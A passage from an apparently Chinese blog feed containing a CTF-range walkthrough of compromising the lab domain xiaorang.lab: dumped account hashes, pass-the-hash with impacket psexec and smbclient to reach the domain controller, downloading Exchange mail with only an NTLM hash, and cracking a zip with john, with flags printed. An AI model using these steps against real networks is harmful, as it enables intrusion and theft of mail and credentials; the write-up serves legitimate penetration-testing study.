class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxf5f7dbd:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">c62918a735c4fde6b5db99d9c441200c</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxf5f7dbd:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:46<span class="hljs-title">e654e5649d6732</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox67dc103:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">c439db29ecbe032623449f1298a0537e6ed26c71dbd457574ac710c0e7c175e4</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox67dc103:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">a952200f4f439c33c289f5a5408f902b</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox67dc103:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:751013<span class="hljs-title">ef3ee36225</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox320fc73:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">a00af0ea0627c6497a806ebcd11c432f7c9658044ca4947438bfca3e371a8363</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox320fc73:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">af5f9c02443cef462bb6b5456b296d60</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox320fc73:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:1949<span class="hljs-title">dc2c7c98bc20</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">Lumia:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:25<span class="hljs-title">e42c5502cfc032897686857062bba71a6b845a3005c467c9aeebf10d3fa850</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">Lumia:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:1<span class="hljs-title">f95632f869be1726ff256888e961775</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">Lumia:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:313<span class="hljs-title">db53e68ecf4ce</span></span><br><span class="hljs-function"><span class="hljs-title">Zhangtong:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">ae16478a2d05fedf251d0050146d8d2e24608aa3d95f014acd5acb9eb8896bd5</span></span><br><span class="hljs-function"><span class="hljs-title">Zhangtong:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:970<span class="hljs-title">b0820700dfa60e2c7c1af1d4bbdd1</span></span><br><span class="hljs-function"><span class="hljs-title">Zhangtong:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:9<span class="hljs-title">b61b3583140c4b5</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">WIN16</span>$:<span class="hljs-title">aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:168<span class="hljs-title">e6cf85d503904792474fe1ae9fe04b3706402ad0dad11f17039f92f6ed033</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">WIN16</span>$:<span class="hljs-title">aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:434<span class="hljs-title">eda0e158169b3ec9cfc36eb0b56c8</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">WIN16</span>$:<span class="hljs-title">des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5:fe457f9716d33b68</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">EXC01</span>$:<span class="hljs-title">aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:76253835716<span class="hljs-title">e7b41cada5d7ef47e2503e3d9638be1b481878e8fc5db0ad7baa1</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">EXC01</span>$:<span class="hljs-title">aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">c322f45c7e5a37bfc0feefbe09fafd65</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">EXC01</span>$:<span class="hljs-title">des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:6<span class="hljs-title">de546da467fbaf8</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">PC</span>$:<span class="hljs-title">aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:2<span class="hljs-title">b8247145b4d99664affb06d332f9a1ae55af8068e27d0b0deb11d0ace8353a9</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">PC</span>$:<span class="hljs-title">aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:7304<span class="hljs-title">e348a7fbec88bb643d729bba3994</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">PC</span>$:<span class="hljs-title">des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5:a1452ca192fec767</span></span><br><span class="hljs-function">[*] <span class="hljs-title">Cleaning</span> <span class="hljs-title">up</span>...</span><br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°åŸŸç®¡ hashï¼Œæ¥ä¸‹æ¥è¿›è¡Œæ¨ªå‘</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">xiaorang.lab\Administrator:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">7</span>acbc09a6c0efd81bfa7d5a1d4238beb:::<br></code></pre></td></tr></table></figure><p>psexec ç™»å…¥åŸŸç®¡æ‹¿ä¸‹åŸŸæ§</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â””â”€# proxychains -q impacket-psexec xiaorang.lab/Administrator@<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span> -hashes :<span class="hljs-number">7</span>acbc09a6c0efd81bfa7d5a1d4238beb -codec GBK<br>Impacket v0.<span class="hljs-number">12</span>.<span class="hljs-number">0</span> - Copyright Fortra, LLC and its affiliated companies<br><br>[*] Requesting shares on <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file NmVfoAWG.exe<br>[*] Opening SVCManager on <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.....<br>[*] Creating service Qcsg on <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.....<br>[*] Starting service Qcsg.....<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>Microsoft Windows [ç‰ˆæœ¬ <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">14393</span>]<br>(c) <span class="hljs-number">2016</span> Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚<br><span class="hljs-function"></span><br><span class="hljs-function">C:\<span class="hljs-title">Windows</span>\<span class="hljs-title">system32</span>&gt; <span class="hljs-title">cd</span> <span class="hljs-title">C</span>:\<span class="hljs-title">users</span>\<span class="hljs-title">administrator</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span>&gt; <span class="hljs-title">dir</span></span><br><span class="hljs-function"> é©±åŠ¨å™¨ <span class="hljs-title">C</span> ä¸­çš„å·æ²¡æœ‰æ ‡ç­¾ã€‚</span><br><span class="hljs-function"> å·çš„åºåˆ—å·æ˜¯ 0637-3<span class="hljs-title">CEF</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span> çš„ç›®å½•</span><br><span class="hljs-function"></span><br><span class="hljs-function">2022/10/23  21:34    &lt;<span class="hljs-title">DIR</span>&gt;          .</span><br><span class="hljs-function">2022/10/23  21:34    &lt;<span class="hljs-title">DIR</span>&gt;          ..</span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Contacts</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Desktop</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Documents</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Downloads</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Favorites</span></span><br><span class="hljs-function">2022/10/23  21:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">flag</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Links</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Music</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Pictures</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Saved</span> <span class="hljs-title">Games</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Searches</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Videos</span></span><br><span class="hljs-function">               0 ä¸ªæ–‡ä»¶              0 å­—èŠ‚</span><br><span class="hljs-function">              14 ä¸ªç›®å½• 28,635,594,752 å¯ç”¨å­—èŠ‚</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span>&gt; <span class="hljs-title">type</span> <span class="hljs-title">flag</span>\<span class="hljs-title">f</span>*</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">flag</span>\<span class="hljs-title">flag.txt</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">____</span>  <span class="hljs-title">___.___</span>   <span class="hljs-title">_____</span>   <span class="hljs-title">________</span> <span class="hljs-title">__________</span>    <span class="hljs-title">_____</span>    <span class="hljs-title">_______</span>    <span class="hljs-title">________</span></span><br><span class="hljs-function">\   \/  /|   | /  <span class="hljs-title">_</span>  \  \<span class="hljs-title">_____</span>  \\<span class="hljs-title">______</span>   \  /  <span class="hljs-title">_</span>  \   \      \  /  <span class="hljs-title">_____</span>/</span><br><span class="hljs-function"> \     / |   |/  /<span class="hljs-title">_</span>\  \  /   |   \|       <span class="hljs-title">_</span>/ /  /<span class="hljs-title">_</span>\  \  /   |   \/   \  <span class="hljs-title">___</span></span><br><span class="hljs-function"> /     \ |   /    |    \/    |    \    |   \/    |    \/    |    \    \<span class="hljs-title">_</span>\  \</span><br><span class="hljs-function">/<span class="hljs-title">___</span>/\  \|<span class="hljs-title">___</span>\<span class="hljs-title">____</span>|<span class="hljs-title">__</span>  /\<span class="hljs-title">_______</span>  /<span class="hljs-title">____</span>|<span class="hljs-title">_</span>  /\<span class="hljs-title">____</span>|<span class="hljs-title">__</span>  /\<span class="hljs-title">____</span>|<span class="hljs-title">__</span>  /\<span class="hljs-title">______</span>  /</span><br><span class="hljs-function">      \<span class="hljs-title">_</span>/            \/         \/       \/         \/         \/        \/</span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">flag04</span>: <span class="hljs-title">flag</span>&#123;411<span class="hljs-title">ce50b</span>-<span class="hljs-title">da03</span>-44<span class="hljs-title">e8</span>-95<span class="hljs-title">a3</span>-7058<span class="hljs-title">a3c711ca</span>&#125;</span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><h1 id="PTH-Exchange"><a href="#PTH-Exchange" class="headerlink" title="PTH Exchange"></a>PTH Exchange</h1><p>æœ€åæ¥çœ‹ DC æœºå™¨</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â””â”€# proxychains -q impacket-smbclient -hashes :<span class="hljs-number">7</span>acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span> -dc-ip <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span><br>Impacket v0.<span class="hljs-number">12</span>.<span class="hljs-number">0</span> - Copyright Fortra, LLC and its affiliated companies<br><br><span class="hljs-built_in">Type</span> <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> list of commands<br># use C$<br># <span class="hljs-built_in">cd</span> /Users/Lumia/Desktop<br># ls<br>drw-rw-rw-          <span class="hljs-number">0</span>  Sun Oct <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">40</span>:<span class="hljs-number">24</span> <span class="hljs-number">2022</span> .<br>drw-rw-rw-          <span class="hljs-number">0</span>  Sun Oct <span class="hljs-number">23</span> <span class="hljs-number">20</span>:<span class="hljs-number">22</span>:<span class="hljs-number">44</span> <span class="hljs-number">2022</span> ..<br>-rw-rw-rw-        <span class="hljs-number">282</span>  Sun Oct <span class="hljs-number">23</span> <span class="hljs-number">20</span>:<span class="hljs-number">22</span>:<span class="hljs-number">55</span> <span class="hljs-number">2022</span> desktop.ini<br>-rw-rw-rw-     <span class="hljs-number">668436</span>  Sun Oct <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">40</span>:<span class="hljs-number">16</span> <span class="hljs-number">2022</span> secret.zip<br># get secret.zip<br></code></pre></td></tr></table></figure><p>flag å°±åœ¨å‹ç¼©åŒ…ä¸­ï¼Œä½†éœ€è¦å¯†ç </p><p><img src="https://img.dkdun.cn/v1/2025/12/3727af254e56e0d2.png"></p><p>ä¹‹å‰æ˜¯æ‹¿åˆ°äº† Lumia çš„ hash</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">xiaorang.lab\Lumia:<span class="hljs-number">1146</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">862976</span>f8b23c13529c2fb1428e710296:::<br></code></pre></td></tr></table></figure><p><a href="https://github.com/Jumbo-WJB/PTH_Exchange">Jumbo-WJB&#x2F;PTH_Exchange: If you only have hash, you can still operate exchange</a> è·å–é‚®ä»¶</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python pthexchange.py  --target https://mail.exchange.com --username &quot;yourusername&quot; --password &quot;yourpassword&quot; --action Download<br></code></pre></td></tr></table></figure><p>ç„¶åä¸‹è½½é‚®ä»¶</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â””â”€# proxychains -q python pthexchange.py  --target https://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>/ --username &quot;Lumia&quot; --password &quot;<span class="hljs-number">862976</span>f8b23c13529c2fb1428e710296:<span class="hljs-number">862976</span>f8b23c13529c2fb1428e710296&quot; --action Download<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">13</span>,<span class="hljs-number">461</span> - DEBUG - [Stage <span class="hljs-number">777</span>] Get Mails Stage <span class="hljs-number">1</span> Finditem ing...<br>/usr/lib/python3/dist-packages/ntlm_auth/rc4.py:<span class="hljs-number">18</span>: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module <span class="hljs-keyword">in</span> <span class="hljs-number">48</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<br>  algo = algorithms.ARC4(key)<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">14</span>,<span class="hljs-number">936</span> - DEBUG - [Stage <span class="hljs-number">777</span>] Get Mails Stage <span class="hljs-number">2</span> GetItem ing...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">18</span>,<span class="hljs-number">530</span> - DEBUG - [Stage <span class="hljs-number">777</span>] Get Mails Stage <span class="hljs-number">3</span> Downloaditem ing...<br>[+] Item [output/item-<span class="hljs-number">0</span>.eml] saved successfully<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">18</span>,<span class="hljs-number">539</span> - DEBUG - [Stage <span class="hljs-number">555</span>] Ready Download Attachmenting...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">18</span>,<span class="hljs-number">794</span> - DEBUG - [Stage <span class="hljs-number">555</span>] Determine <span class="hljs-keyword">if</span> there are attachments <span class="hljs-keyword">in</span> the email...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">18</span>,<span class="hljs-number">794</span> - DEBUG - [Stage <span class="hljs-number">555</span>] This Mail Has Attachment...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">18</span>,<span class="hljs-number">794</span> - DEBUG - [Stage <span class="hljs-number">555</span>] <span class="hljs-built_in">Start</span> Get Attachment Content...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">21</span>,<span class="hljs-number">245</span> - DEBUG - [Stage <span class="hljs-number">555</span>] <span class="hljs-built_in">Start</span> Download Attachment...<br>[+] Item [output/item-<span class="hljs-number">0</span>-secret.zip] saved successfully<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">21</span>,<span class="hljs-number">249</span> - DEBUG - [Stage <span class="hljs-number">777</span>] Get Mails Stage <span class="hljs-number">2</span> GetItem ing...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">21</span>,<span class="hljs-number">448</span> - DEBUG - [Stage <span class="hljs-number">777</span>] Get Mails Stage <span class="hljs-number">3</span> Downloaditem ing...<br>[+] Item [output/item-<span class="hljs-number">1</span>.eml] saved successfully<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">21</span>,<span class="hljs-number">449</span> - DEBUG - [Stage <span class="hljs-number">555</span>] Ready Download Attachmenting...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">21</span>,<span class="hljs-number">635</span> - DEBUG - [Stage <span class="hljs-number">555</span>] Determine <span class="hljs-keyword">if</span> there are attachments <span class="hljs-keyword">in</span> the email...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">21</span>,<span class="hljs-number">635</span> - DEBUG - [Stage <span class="hljs-number">555</span>] This Mail Has Attachment...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">21</span>,<span class="hljs-number">635</span> - DEBUG - [Stage <span class="hljs-number">555</span>] <span class="hljs-built_in">Start</span> Get Attachment Content...<br><span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">38</span>:<span class="hljs-number">21</span>,<span class="hljs-number">847</span> - DEBUG - [Stage <span class="hljs-number">555</span>] <span class="hljs-built_in">Start</span> Download Attachment...<br>[+] Item [output/item-<span class="hljs-number">1</span>-phone lists.csv] saved successfully<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°ä¸€äº›æ–‡ä»¶ï¼Œå…¶ä¸­æœ‰ä¸€å°é‚®ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/14369fd9205e3afc.png"></p><p>â€œEncrypt with your phone number.â€ï¼Œæç¤ºæ‰‹æœºå·è§£å¯†ï¼Œæå–æ‰‹æœºå·å¯¹ zip çˆ†ç ´</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â””â”€# cut -d &#x27;,&#x27; -f3 item-<span class="hljs-number">1</span>-phone\ lists.csv &gt; phone.txt<br><br>â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y/PTH_Exchange-main/output]<br>â””â”€# zip2john item-<span class="hljs-number">0</span>-secret.zip &gt;hash<br><span class="hljs-built_in">ver</span> <span class="hljs-number">2</span>.<span class="hljs-number">0</span> item-<span class="hljs-number">0</span>-secret.zip/flag.docx PKZIP Encr: cmplen=<span class="hljs-number">668284</span>, decmplen=<span class="hljs-number">671056</span>, crc=AFEF0968 ts=AB91 cs=afef <span class="hljs-built_in">type</span>=<span class="hljs-number">8</span><br><br>â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y/PTH_Exchange-main/output]<br>â””â”€# john --wordlist=phone.txt hash<br>Using default input encoding: UTF-<span class="hljs-number">8</span><br>Loaded <span class="hljs-number">1</span> password hash (PKZIP [<span class="hljs-number">32</span>/<span class="hljs-number">64</span>])<br>Will run <span class="hljs-number">16</span> OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br><span class="hljs-number">18763918468</span>      (item-<span class="hljs-number">0</span>-secret.zip/flag.docx)<br><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> DONE (<span class="hljs-number">2025</span>-<span class="hljs-number">09</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">45</span>) <span class="hljs-number">16</span>.<span class="hljs-number">66</span>g/s <span class="hljs-number">8350</span>p/s <span class="hljs-number">8350</span>c/s <span class="hljs-number">8350</span>C/s phone..<span class="hljs-number">15989600577</span><br>Use the &quot;--show&quot; option to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure><p>å¯†ç  18763918468</p><p><img src="https://img.dkdun.cn/v1/2025/12/be9c310feb41241d.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag03</span>: flag&#123;cf0c753c-<span class="hljs-number">233</span>f-<span class="hljs-number">4729</span>-<span class="hljs-number">8984</span>-<span class="hljs-number">0746</span>ea5878b7&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>æ˜¥ç§‹äº‘é•œ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fastjson Exchange WirteDacl PTH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-8æœˆ</title>
    <link href="/2025/09/06/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-8%E6%9C%88/"/>
    <url>/2025/09/06/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-8%E6%9C%88/</url>
    
